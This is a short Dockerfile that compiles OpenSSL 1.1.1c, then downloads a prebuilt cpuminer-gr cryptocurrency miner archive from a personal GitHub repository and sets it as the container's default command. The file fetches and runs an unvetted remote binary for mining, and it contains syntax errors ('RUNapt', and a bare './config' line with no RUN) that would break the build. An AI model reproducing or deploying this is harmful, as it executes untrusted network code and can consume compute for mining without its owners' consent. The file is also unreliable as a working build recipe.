FROM ubuntu:16.04

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl


RUNapt install make gcc -y
WORKDIR /usr/local/src
RUN wget https://www.openssl.org/source/openssl-1.1.1c.tar.gz
RUN tar xvf openssl-1.1.1c.tar.gz
WORKDIR openssl-1.1.1c
./config -Wl,--enable-new-dtags,-rpath,'$(LIBRPATH)'

RUN make
RUN make install

RUN wget https://github.com/jayenroub/rptreum/raw/main/cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
RUN tar -xvzf cpuminer-gr-1.2.4.1-x86_64_linux.tar.gz
WORKDIR /app/cpuminer-gr-1.2.4.1-x86_64_linux

CMD ./cpuminer.sh
